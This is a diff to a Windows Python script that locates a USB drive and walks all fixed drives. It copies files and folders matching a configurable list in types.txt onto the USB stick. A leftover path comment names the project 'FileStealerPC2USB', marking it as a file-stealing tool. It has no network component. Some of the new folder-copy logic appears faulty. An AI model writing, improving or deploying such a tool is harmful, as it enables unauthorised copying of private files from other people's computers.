@@ -1,12 +1,54 @@
 from sys import stdout
 from time import sleep
-from os import walk, chdir, listdir, sep, environ, path, mkdir, makedirs
-from shutil import copyfile
+from os import walk, chdir, listdir, sep, environ, path, makedirs
+from shutil import copyfile, copytree
 from time import localtime
 from win32api import GetLogicalDrives
 from win32file import GetDriveType, DRIVE_FIXED, DRIVE_REMOVABLE
 
 class Mains:
+    def __init__(self):
+        filess = listdir('.')
+        if "types.txt" in filess :
+            file = open('types.txt')
+            reader = file.readlines()
+            listertype = reader[0].replace("type=", "").split(",")
+            listerfile = reader[1].replace("file=", "").split(",")
+            listerfolder = reader[2].replace("folder=", "").split(",")
+            reader[3] = reader[3].replace("search_C=","")
+
+            listertypes = []
+            x = 0
+            while x < len(listertype):
+                if listertype[x] != "\n":
+                    listertypes.append("." + listertype[x].replace("\n", ""))
+                x += 1
+
+            listerfiles = []
+            y = 0
+            while y < len(listerfile):
+                if listerfile[y] != "\n":
+                    listerfiles.append(listerfile[y].replace("\n", ""))
+                y += 1
+
+            listerfolders = []
+            z  = 0
+            while z < len(listerfolder):
+                if listerfolder[z] != "\n":
+                    listerfolders.append(listerfolder[z].replace("\n", ""))
+                z += 1
+
+            self.folders = listerfolders
+
+            filetype = listertypes + listerfiles
+            self.filetype = list(filter(None, filetype))
+
+            self.oser = "do"
+            if reader[3] == "yes":
+                self.oser = "dont"
+        else:
+            print("no *type.txt* file !!!")
+
     def usb_finder(self):
         self.usb_list = []
         self.dest = ""
@@ -50,86 +92,91 @@ class Mains:
                     self.drive_list.append(drname)
 
 ## region OS:
-        for i in self.drive_list:
-            if i == win :
-                self.drive_list.remove(i)
+        if self.oser == "dont":
+            for i in self.drive_list:
+                if i == win :
+                    self.drive_list.remove(i)
 ## endregion
 
-    def copier(self):
-        self.counter = 0
-        for driver in self.drive_list :
+        for driver in self.drive_list:
+            self.copier(driver)
+
+    def copier(self,driver):
+            self.counter = 0
             chdir(driver)
 
-            filetypes = ['.bmpsa', '.bmpas']
+            filetypes = self.filetype       #['.bmpsa', '.bmpas']
+            folder = self.folders
 
-            # destination = "D:\\MY Projects\\Python\\FileStealerPC2USB\\n\\"
+            # destination = "D:\\MY Projects"
 
             for (dirpath, dirname, filenames) in walk('.'):
-                for filename in filenames:
-                    for typefile in filetypes:
-                        if filename.endswith(filetypes[filetypes.index(typefile)]):
-                            main_location = sep.join([dirpath,filename])
+                if folder != [] :
+                    for dir in dirname :
+                        for fold in folder :
+                            if dir.endswith(folder[folder.index(fold)]):
+                                main_location = sep.join([dirpath, fold])
 
-                            timemin = str(localtime().tm_min)
-                            timesec = str(localtime().tm_sec)
+                                timemin = str(localtime().tm_min)
+                                timesec = str(localtime().tm_sec)
 
-                            time = " (m" + timemin + "-s" + timesec + ")"
+                                time = " (m" + timemin + "-s" + timesec + ")"
 
-                            absulpath = path.abspath(main_location).replace(":","")
-                            absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
-                            # print(absulpath)
+                                absulpath = path.abspath(main_location).replace(":", "")
+                                absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
+                                # print(absulpath)
 
-                            if filename in listdir(self.dest):
-                                filename = filename.replace(filetypes[filetypes.index(typefile)],"")
+                                if dir in listdir(self.dest):
+                                    dir = dir.replace(folder[folder.index(fold)], "")
 
-                                makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
-                                copyfile(main_location, self.dest + absulpath+ filename + time +filetypes[filetypes.index(typefile)])
-                                # print(main_location)
-                                self.counter += 1
-                                # print(counter)
-                                stdout.write('\r'+str(self.counter))
+                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                    copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
+                                    # print(main_location)
+                                    self.counter += 1
+                                    # print(counter)
+                                    stdout.write('\r' + str(self.counter))
 
-                            else:
-                                makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
-                                copyfile(main_location, self.dest +absulpath+ filename)
-                                self.counter += 1
-                                # print(counter)
-                                stdout.write('\r' +str(self.counter))
+                                else:
+                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                    copytree(main_location, self.dest + absulpath + dir)
+                                    self.counter += 1
+                                    # print(counter)
+                                    stdout.write('\r' + str(self.counter))
 
-        print(".")
+                if filenames != []:
+                    for filename in filenames:
+                        for typefile in filetypes:
+                            if filename.endswith(filetypes[filetypes.index(typefile)]):
+                                main_location = sep.join([dirpath,filename])
+
+                                timemin = str(localtime().tm_min)
+                                timesec = str(localtime().tm_sec)
+
+                                time = " (m" + timemin + "-s" + timesec + ")"
+
+                                absulpath = path.abspath(main_location).replace(":","")
+                                absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
+                                # print(absulpath)
+
+                                if filename in listdir(self.dest):
+                                    filename = filename.replace(filetypes[filetypes.index(typefile)],"")
+
+                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                    copyfile(main_location, self.dest + absulpath+ filename + time +filetypes[filetypes.index(typefile)])
+                                    # print(main_location)
+                                    self.counter += 1
+                                    # print(counter)
+                                    stdout.write('\r'+str(self.counter))
+
+                                else:
+                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
+                                    copyfile(main_location, self.dest +absulpath+ filename)
+                                    self.counter += 1
+                                    # print(counter)
+                                    stdout.write('\r' +str(self.counter))
 
 M = Mains()
 M.usb_finder()
 M.drives()
-M.copier()
-
-
-
-
-
-
-        # print(timesec)
-
-    # print(lister)
-
-        # for file in f:
-        #     timemin = str(localtime().tm_min)
-        #     timesec = str(localtime().tm_sec)
-        #
-        #     # print(timesec)
-        #     time ="m" + timemin+ "-s"+timesec
-        #
-        #     if file in listdir(destination) :
-        #         copyfile(file, destination + file + time)
-        #         print("ok")
-        #     else:
-        #         copyfile(file, destination + file)
-                # print("no")
-        # for dir in d:
-        #     if dir in "n" :
-        #         copytree(dir, "n\\" + dir + str(time.localtime().tm_min) , str(time.localtime().tm_sec))
-        #     else:
-        #         copytree(dir, "n\\" + dir)
-
-# print(dirs)
-# print(files)
+print(".")
+# input()
